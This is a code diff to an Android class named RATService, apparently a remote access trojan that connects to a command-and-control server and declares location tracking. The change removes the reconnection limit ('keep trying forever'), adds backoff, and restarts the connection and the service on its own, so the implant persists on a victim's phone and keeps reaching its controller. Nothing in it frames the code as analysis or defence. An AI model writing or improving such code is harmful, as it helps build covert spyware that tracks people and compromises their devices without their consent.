@@ -61,9 +61,7 @@ public class RATService extends Service {
     
     // Simple timeouts like working code
     private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
-    private static final int MAX_RETRY_DELAY = 60000; // 60 seconds max
     private static final int RETRY_INTERVAL = 30; // seconds
-    private static final int MAX_RETRIES = 10;
     private static final int READ_TIMEOUT_CHECK = 300000; // 5 minutes - just in case
     
     private Socket socket;
@@ -73,7 +71,6 @@ public class RATService extends Service {
     private ExecutorService executor;
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
-    private int currentRetryDelay = 5000;
     private int consecutiveFailures = 0;
     
     // Location tracking variables
@@ -239,6 +236,13 @@ public class RATService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "System service onStartCommand");
+        
+        // Restart connection if it's not running
+        if (executor == null || executor.isShutdown()) {
+            executor = Executors.newSingleThreadExecutor();
+            startConnection();
+        }
+        
         scheduleAllJobs();
         return START_STICKY;
     }
@@ -293,18 +297,23 @@ public class RATService extends Service {
     }
     
     private boolean isNetworkAvailable() {
-        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
-        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
+        try {
+            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
+            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
+        } catch (Exception e) {
+            return false;
+        }
     }
     
     private void startConnection() {
-        if (executor == null) {
+        if (executor == null || executor.isShutdown()) {
             executor = Executors.newSingleThreadExecutor();
         }
         
         executor.execute(() -> {
             int retryCount = 0;
+            int consecutiveNetworkErrors = 0;
             
             while (isRunning.get()) {
                 try {
@@ -315,6 +324,9 @@ public class RATService extends Service {
                         continue;
                     }
                     
+                    // Reset network error counter on successful check
+                    consecutiveNetworkErrors = 0;
+                    
                     // Connect with timeout
                     socket = new Socket();
                     socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
@@ -323,10 +335,9 @@ public class RATService extends Service {
                     out = new PrintWriter(socket.getOutputStream(), true);
                     in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     
-                    Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
+                    Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                     
-                    // Reset retry delay on successful connection
-                    currentRetryDelay = 5000;
+                    // Reset counters on successful connection
                     consecutiveFailures = 0;
                     retryCount = 0;
                     
@@ -353,6 +364,13 @@ public class RATService extends Service {
                 } catch (IOException e) {
                     Log.e(TAG, "Connection error: " + e.getMessage());
                     consecutiveFailures++;
+                    consecutiveNetworkErrors++;
+                    
+                    // If we get too many network errors, increase wait time
+                    if (consecutiveNetworkErrors > 5) {
+                        Log.w(TAG, "Multiple network errors, waiting longer...");
+                        Thread.sleep(60000); // Wait 1 minute
+                    }
                 } catch (Exception e) {
                     Log.e(TAG, "Unexpected error", e);
                     consecutiveFailures++;
@@ -360,18 +378,22 @@ public class RATService extends Service {
                     closeConnection();
                 }
                 
-                // Simple retry logic with max retries
+                // Keep trying forever - NO MAX RETRIES LIMIT
                 if (isRunning.get()) {
-                    retryCount++;
-                    if (retryCount > MAX_RETRIES) {
-                        Log.e(TAG, "Max retries (" + MAX_RETRIES + ") reached, stopping connection attempts");
-                        // Schedule a restart via alarm
-                        scheduleRestartWithAlarm();
-                        break;
+                    // Calculate delay with exponential backoff
+                    long delay;
+                    if (consecutiveFailures < 5) {
+                        delay = RETRY_INTERVAL * 1000; // 30 seconds
+                    } else if (consecutiveFailures < 10) {
+                        delay = 60000; // 1 minute
+                    } else if (consecutiveFailures < 20) {
+                        delay = 120000; // 2 minutes
+                    } else {
+                        delay = 300000; // 5 minutes max
                     }
                     
-                    long delay = RETRY_INTERVAL * 1000;
-                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + "/" + MAX_RETRIES + ")");
+                    retryCount++;
+                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
                     
                     try {
                         Thread.sleep(delay);
@@ -381,6 +403,10 @@ public class RATService extends Service {
                     }
                 }
             }
+            
+            // If we exit the loop, schedule a full service restart
+            Log.w(TAG, "Connection loop ended, scheduling service restart");
+            scheduleRestartWithAlarm();
         });
     }
     
@@ -909,6 +935,7 @@ public class RATService extends Service {
         
         if (executor != null) {
             executor.shutdownNow();
+            executor = null;
         }
         
         if (wakeLock != null && wakeLock.isHeld()) {
